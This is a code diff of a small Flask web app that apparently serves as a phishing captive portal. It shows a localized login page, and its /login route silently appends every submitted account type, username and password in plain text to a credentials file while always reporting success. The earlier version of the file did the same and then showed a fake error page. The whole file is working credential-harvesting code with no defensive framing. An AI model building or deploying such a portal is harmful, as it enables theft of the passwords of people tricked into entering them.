@@ -1,84 +1,64 @@
 # -*- coding: utf-8 -*-
 
 from os.path import join, dirname, abspath
-from flask import Flask, render_template, request, redirect
+from flask import Flask, redirect, render_template, request
 import json
 
 
 app = Flask(
     __name__,
-    static_url_path = '',
-    static_folder = 'public',
-    template_folder = 'templates'
+    static_url_path = '/',
+    static_folder = 'public'
 )
 
 # App configuration
 current_dir = dirname(abspath(__file__))
 config_file = join(current_dir, 'portal.conf')
-locale_file = join(join(current_dir, 'locale'), '%s.json')
-credentials = join(current_dir, 'credentials.csv')
+locale_file = join(current_dir, 'locale.json')
+credentials = join(current_dir, 'credentials.txt')
 app.config.from_pyfile(config_file)
 
 
-@app.route('/')
-def root():
-    return redirect('/portal')
+@app.errorhandler(404)
+def not_found(e):
+    return redirect('/')
 
-@app.route('/authentication', methods = ['POST'])
-@app.route('/registration', methods = ['POST'])
-def authentication():
-    save_credentials(request.form)
-    locale = app.config['LOCALE']
-    page_content = locale['error']
+@app.route('/')
+def portal():
+    lang = app.config['LANG']
+    locale = get_locale(lang)
     return render_template(
-        'error.html',
-        page = page_content,
-        path = request.path
+        'portal.html',
+        locale = locale
     )
 
-@app.route('/<page>')
-def send_page(page):
-    try:
-        locale = app.config['LOCALE']
-        page_content = locale[page]
-        return render_template(
-            '%s.html' % page,
-            page = page_content
-        )
-    except:
-        return redirect('/portal')
+@app.route('/login', methods = ['POST'])
+def authentication():
+    save_credentials(request.get_json())
+    return json.dumps({'success': True})
 
-
-def save_credentials(form):
-    type = form.get('type')
-    username = form.get('username')
-    email = form.get('email')
-    password = form.get('password')
-    repeat = form.get('repeat')
-    f = open(credentials, 'a')
-    with open(credentials, 'a') as f:
-        f.write("%s,%s,%s,%s,%s\n" % (
-            type,
-            username, email,
-            password, repeat
-        ))
 
 def get_locale(lang):
-    filename = locale_file % lang
+    filename = locale_file
     with open(filename) as f:
-        return json.load(f)
+        return json.load(f)[lang]
+
+def save_credentials(form):
+    type = form['type']
+    username = form['username']
+    password = form['password']
+    with open(credentials, 'a') as f:
+        f.write("%s,%s,%s\n" % (
+            type,
+            username,
+            password
+        ))
 
 
-def main():
-    lang = app.config['LANG']
-    app.config['LOCALE'] = get_locale(lang)
+if __name__ == '__main__':
     app.run(
         host = app.config['HOST'],
         port = app.config['PORT'],
         debug = app.config['DEBUG'],
         threaded = True
     )
-
-
-if __name__ == '__main__':
-    main()
